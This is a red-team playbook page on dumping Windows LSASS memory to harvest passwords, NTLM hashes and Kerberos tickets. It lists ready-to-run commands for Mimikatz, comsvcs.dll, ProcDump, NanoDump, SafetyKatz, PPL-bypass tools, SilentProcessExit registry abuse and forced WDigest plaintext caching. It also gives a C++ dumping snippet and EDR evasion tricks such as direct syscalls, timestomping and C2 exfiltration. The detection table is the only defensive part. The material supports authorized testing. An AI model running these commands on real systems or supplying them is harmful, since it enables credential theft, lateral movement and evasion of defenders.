# LSASS Credential Dumping

> **MITRE ATT&CK**: Credential Access > T1003.001 - OS Credential Dumping: LSASS Memory
> **Platforms**: Windows
> **Required Privileges**: Local Administrator / SYSTEM
> **OPSEC Risk**: High

## Strategic Overview

LSASS (Local Security Authority Subsystem Service) holds plaintext passwords, NTLM hashes,
and Kerberos tickets for all interactively logged-on users. Dumping LSASS is the single
highest-value credential access technique on a Windows endpoint. As a Red Team Lead, you
must understand that every modern EDR has detections for LSASS access -- the difference
between a burned operation and a successful one is *how* you dump it.

**When to use LSASS dumping:**
- After initial foothold to escalate laterally with harvested credentials
- On jump servers and admin workstations where privileged sessions exist
- When you need plaintext passwords (pre-Win10 1607 or WDigest enabled)
- To extract Kerberos TGTs for pass-the-ticket attacks

**When to avoid it:**
- If Credential Guard is enabled (virtualization-based security isolates LSASS)
- If the target has a mature EDR with kernel-level LSASS protection
- If you already have NTLM hashes from other sources (SAM, DCSync)

## Technical Deep-Dive

### 1. Mimikatz (Classic - Heavily Signatured)

```
# Interactive
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump specific credential types
sekurlsa::msv          # NTLM hashes only
sekurlsa::wdigest      # Plaintext (if WDigest enabled)
sekurlsa::kerberos     # Kerberos tickets
sekurlsa::tspkg        # TsPkg credentials
```

### 2. Task Manager (GUI - Least Suspicious)

```
# Manual steps:
# 1. Open Task Manager as Administrator
# 2. Details tab → find lsass.exe
# 3. Right-click → Create dump file
# 4. Dump saved to %TEMP%\lsass.DMP
# 5. Exfiltrate and parse offline with Mimikatz:
mimikatz.exe "sekurlsa::minidump lsass.DMP" "sekurlsa::logonpasswords" "exit"
```

### 3. comsvcs.dll (LOLBIN - No Tools Required)

```
# Find LSASS PID
tasklist /fi "imagename eq lsass.exe"

# Dump using comsvcs.dll MiniDump export
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full

# PowerShell variant (avoids rundll32 command line logging)
$p = Get-Process lsass
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $p.Id C:\temp\out.dmp full
```

### 4. ProcDump (Sysinternals - Microsoft Signed)

```
# Standard dump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Using PID instead of name (less obvious command line)
procdump.exe -accepteula -ma <PID> C:\temp\debug.dmp

# Note: Modern EDR flags ProcDump targeting LSASS regardless of signing
```

### 5. NanoDump (Direct Syscalls - EDR Evasion)

```
# Standard dump with direct syscalls
nanodump.exe --write C:\temp\lsass.dmp

# Fork LSASS process first (avoids direct handle to LSASS)
nanodump.exe --fork --write C:\temp\lsass.dmp

# Use LSASS snapshot (creates a snapshot, dumps from snapshot)
nanodump.exe --snapshot --write C:\temp\lsass.dmp

# Dump to named pipe (avoids file on disk)
nanodump.exe --pipe nanopipe
# Read from another process

# In-memory dump with no file written
nanodump.exe --pipe --valid-sig
```

### 6. SafetyKatz (.NET In-Memory)

```
# Execute via Cobalt Strike
execute-assembly SafetyKatz.exe

# Creates minidump in memory, parses with embedded Mimikatz, no file on disk
# Output: NTLM hashes and Kerberos tickets directly to console
```

### 7. PPL Bypass (When RunAsPPL Is Enabled)

```
# Check if LSASS runs as PPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

# PPLdump - exploit KNOWN_DLL redirection
PPLdump.exe lsass.exe lsass.dmp

# PPLMedic - userland PPL bypass
PPLMedic.exe dump lsass.exe lsass.dmp

# mimidrv.sys - Mimikatz kernel driver (requires driver loading privileges)
mimikatz.exe "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
```

### 8. MiniDumpWriteDump API (Custom Tooling)

```cpp
// Core API call for custom dumpers
#include <DbgHelp.h>
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
HANDLE hFile = CreateFile(L"C:\\temp\\out.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
MiniDumpWriteDump(hProcess, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
```

### 9. Silent Process Exit (WerFault-Based)

```
# Configure silent process exit to trigger WerFault dump of LSASS
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\temp" /f

# Trigger via process inspection (causes WerFault to dump LSASS)
# Dump appears in C:\temp as a legitimate WerFault crash dump
```

### 10. Enabling WDigest for Plaintext Credentials

```
# Force plaintext credential caching (requires users to re-authenticate)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# Lock workstation to force re-authentication, then dump
rundll32.exe user32.dll,LockWorkStation
# Wait for user to log back in, then dump LSASS
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| Process accessing LSASS | Sysmon Event ID 10 | GrantedAccess 0x1010, 0x1410, 0x1FFFFF |
| Suspicious process creation | Sysmon Event ID 1 | Command lines referencing lsass |
| MiniDumpWriteDump call | EDR API hooking | DbgHelp.dll!MiniDumpWriteDump |
| Credential Guard events | Event ID 6153, 6154 | VSM credential isolation events |
| LSASS module load | Sysmon Event ID 7 | Unexpected DLLs loaded into LSASS |

### Evasion Techniques

1. **Direct syscalls** - NanoDump, SysWhispers - bypass userland API hooks
2. **Process forking** - Fork LSASS, dump the fork instead of the real process
3. **LSASS snapshot** - MiniDumpWriteDump with MiniDumpCallbackOption to snapshot
4. **Duplicate handle** - Open a benign process, duplicate handle to LSASS
5. **Avoid disk writes** - Dump to named pipe, exfil over C2 channel directly
6. **Timestomping** - If writing to disk, modify file timestamps
7. **Custom MiniDump** - Reimplement MiniDumpWriteDump to avoid hooking
8. **LSASS clone** - Use PssCaptureSnapshot to clone LSASS memory space

### Pre-Engagement Checks

```powershell
# Check Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select *

# Check RunAsPPL
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL

# Check WDigest status
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

## Cross-References

- [SAM & LSA Secrets](sam-lsa-secrets.md) - Alternative local credential extraction
- [DCSync](dcsync.md) - Domain-wide credential extraction without touching endpoints
- [DPAPI Abuse](dpapi-abuse.md) - Decrypt credentials protected by DPAPI
- [Kerberos Attacks](kerberos-credential-attacks.md) - Use extracted tickets for lateral movement
- ../06-lateral-movement/ - Use extracted credentials for lateral movement
- ../12-active-directory-deep-dive/ - Full AD attack chains

## References

- https://attack.mitre.org/techniques/T1003/001/
- https://www.elastic.co/blog/ten-process-injection-techniques
- https://github.com/helpsystems/nanodump
- https://github.com/gentilkiwi/mimikatz
- https://github.com/Hackndo/lsassy
- https://itm4n.github.io/lsass-runasppl/
- https://www.microsoft.com/en-us/security/blog/credential-guard/
